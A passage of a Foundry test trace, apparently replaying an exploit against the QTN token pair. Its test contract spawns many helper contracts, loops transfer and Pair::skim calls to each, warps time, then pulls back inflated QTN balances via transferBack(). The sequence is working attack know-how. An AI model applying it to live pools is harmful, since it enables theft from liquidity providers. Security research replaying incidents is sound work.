    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x89CA9F4f77B267778EB2eA0Ba1bEAdEe8523af36], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x89CA9F4f77B267778EB2eA0Ba1bEAdEe8523af36], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x89CA9F4f77B267778EB2eA0Ba1bEAdEe8523af36], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x89CA9F4f77B267778EB2eA0Ba1bEAdEe8523af36], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0xe54a55121A47451c5727ADBAF9b9FC1643477e25
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0xe54a55121A47451c5727ADBAF9b9FC1643477e25])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0xe54a55121A47451c5727ADBAF9b9FC1643477e25], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xe54a55121A47451c5727ADBAF9b9FC1643477e25], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0xe54a55121A47451c5727ADBAF9b9FC1643477e25], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xe54a55121A47451c5727ADBAF9b9FC1643477e25], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x94771550282853f6E0124c302F7dE1Cf50aa45CA
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x94771550282853f6E0124c302F7dE1Cf50aa45CA])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x94771550282853f6E0124c302F7dE1Cf50aa45CA], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x94771550282853f6E0124c302F7dE1Cf50aa45CA], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x94771550282853f6E0124c302F7dE1Cf50aa45CA], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x94771550282853f6E0124c302F7dE1Cf50aa45CA], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x8227724C33C1748A42d1C1cD06e21AB8Deb6eB0A
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x8227724C33C1748A42d1C1cD06e21AB8Deb6eB0A])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x8227724C33C1748A42d1C1cD06e21AB8Deb6eB0A], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x8227724C33C1748A42d1C1cD06e21AB8Deb6eB0A], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x8227724C33C1748A42d1C1cD06e21AB8Deb6eB0A], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x8227724C33C1748A42d1C1cD06e21AB8Deb6eB0A], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x883816205341a6ba3C32AE8dAdCEbDD9d59BC2C4
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x883816205341a6ba3C32AE8dAdCEbDD9d59BC2C4])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x883816205341a6ba3C32AE8dAdCEbDD9d59BC2C4], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x883816205341a6ba3C32AE8dAdCEbDD9d59BC2C4], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x883816205341a6ba3C32AE8dAdCEbDD9d59BC2C4], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x883816205341a6ba3C32AE8dAdCEbDD9d59BC2C4], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0xe916cadb12C49389E487eB1e8194B1459b29B0eC
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0xe916cadb12C49389E487eB1e8194B1459b29B0eC])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0xe916cadb12C49389E487eB1e8194B1459b29B0eC], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xe916cadb12C49389E487eB1e8194B1459b29B0eC], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0xe916cadb12C49389E487eB1e8194B1459b29B0eC], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xe916cadb12C49389E487eB1e8194B1459b29B0eC], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x83898D1F3C03189fF03B471dd3456908FCA4423d
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x83898D1F3C03189fF03B471dd3456908FCA4423d])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x83898D1F3C03189fF03B471dd3456908FCA4423d], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x83898D1F3C03189fF03B471dd3456908FCA4423d], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x83898D1F3C03189fF03B471dd3456908FCA4423d], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x83898D1F3C03189fF03B471dd3456908FCA4423d], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x6AFc743aa4E9D98D0F53Ff111996E9817d79D301
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x6AFc743aa4E9D98D0F53Ff111996E9817d79D301])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x6AFc743aa4E9D98D0F53Ff111996E9817d79D301], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x6AFc743aa4E9D98D0F53Ff111996E9817d79D301], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x6AFc743aa4E9D98D0F53Ff111996E9817d79D301], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x6AFc743aa4E9D98D0F53Ff111996E9817d79D301], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x3450a15Dc9cbDD5C0e28cC22474D88AD7e2695A3
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x3450a15Dc9cbDD5C0e28cC22474D88AD7e2695A3])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x3450a15Dc9cbDD5C0e28cC22474D88AD7e2695A3], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x3450a15Dc9cbDD5C0e28cC22474D88AD7e2695A3], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x3450a15Dc9cbDD5C0e28cC22474D88AD7e2695A3], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x3450a15Dc9cbDD5C0e28cC22474D88AD7e2695A3], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0xE194aA6b80fFd71989dd196c7f84fa624b8d7D5d
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0xE194aA6b80fFd71989dd196c7f84fa624b8d7D5d])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0xE194aA6b80fFd71989dd196c7f84fa624b8d7D5d], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xE194aA6b80fFd71989dd196c7f84fa624b8d7D5d], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0xE194aA6b80fFd71989dd196c7f84fa624b8d7D5d], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xE194aA6b80fFd71989dd196c7f84fa624b8d7D5d], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x98E53ecDDd253E5A7f845a713D7fc8853CF47EDE
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x98E53ecDDd253E5A7f845a713D7fc8853CF47EDE])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x98E53ecDDd253E5A7f845a713D7fc8853CF47EDE], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x98E53ecDDd253E5A7f845a713D7fc8853CF47EDE], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x98E53ecDDd253E5A7f845a713D7fc8853CF47EDE], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x98E53ecDDd253E5A7f845a713D7fc8853CF47EDE], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [0] VM::warp(1674003987 [1.674e9])
    │   └─ ← [Return] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 285578431822724309092875 [2.855e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 285578431822724309092875 [2.855e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 285578431822724309092875 [2.855e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
    │   │   └─ ← [Return] 284718946256108740950042 [2.847e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 284718946256108740950042 [2.847e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 284718946256108740950042 [2.847e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]
    │   │   └─ ← [Return] 283864618633985670897020 [2.838e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 283864618633985670897020 [2.838e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 283864618633985670897020 [2.838e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
    │   │   └─ ← [Return] 283015402664476379243416 [2.83e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 283015402664476379243416 [2.83e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 283015402664476379243416 [2.83e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0xc7183455a4C133Ae270771860664b6B7ec320bB1]) [staticcall]
    │   │   └─ ← [Return] 282171252608001302707530 [2.821e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 282171252608001302707530 [2.821e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 282171252608001302707530 [2.821e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0xa0Cb889707d426A7A386870A03bc70d1b0697598]) [staticcall]
    │   │   └─ ← [Return] 281332123269067815387530 [2.813e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 281332123269067815387530 [2.813e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 281332123269067815387530 [2.813e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211]) [staticcall]
    │   │   └─ ← [Return] 280497969988204105728349 [2.804e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 280497969988204105728349 [2.804e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 280497969988204105728349 [2.804e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c]) [staticcall]
    │   │   └─ ← [Return] 279668748634036126213095 [2.796e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 279668748634036126213095 [2.796e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 279668748634036126213095 [2.796e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x03A6a84cD762D9707A21605b548aaaB891562aAb]) [staticcall]
    │   │   └─ ← [Return] 278844415595504663797316 [2.788e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 278844415595504663797316 [2.788e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 278844415595504663797316 [2.788e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF]) [staticcall]
    │   │   └─ ← [Return] 278024927774219648508409 [2.78e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 278024927774219648508409 [2.78e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 278024927774219648508409 [2.78e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x15cF58144EF33af1e14b5208015d11F9143E27b9]) [staticcall]
    │   │   └─ ← [Return] 277210242576948885206082 [2.772e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 277210242576948885206082 [2.772e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x15cF58144EF33af1e14b5208015d11F9143E27b9], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 277210242576948885206082 [2.772e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C]) [staticcall]
    │   │   └─ ← [Return] 276400317908238459296507 [2.764e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 276400317908238459296507 [2.764e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 276400317908238459296507 [2.764e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x2a07706473244BC757E10F2a9E86fB532828afe3]) [staticcall]
    │   │   └─ ← [Return] 275595112163162131264427 [2.755e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 275595112163162131264427 [2.755e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x2a07706473244BC757E10F2a9E86fB532828afe3], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 275595112163162131264427 [2.755e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7]) [staticcall]
    │   │   └─ ← [Return] 274794584220197097284155 [2.747e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 274794584220197097284155 [2.747e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 274794584220197097284155 [2.747e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0xD16d567549A2a2a2005aEACf7fB193851603dd70]) [staticcall]
    │   │   └─ ← [Return] 273998693434223553940524 [2.739e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 273998693434223553940524 [2.739e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 273998693434223553940524 [2.739e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
    │   ├─ [1120] QTN::balanceOf(QTNContract: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758]) [staticcall]
    │   │   └─ ← [Return] 273207399629645564281524 [2.732e23]
    │   ├─ [9923] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 273207399629645564281524 [2.732e23])
    │   │   ├─ emit Transfer(from: QTNContract: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 273207399629645564281524 [2.732e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [12086] QTNContract::transferBack()
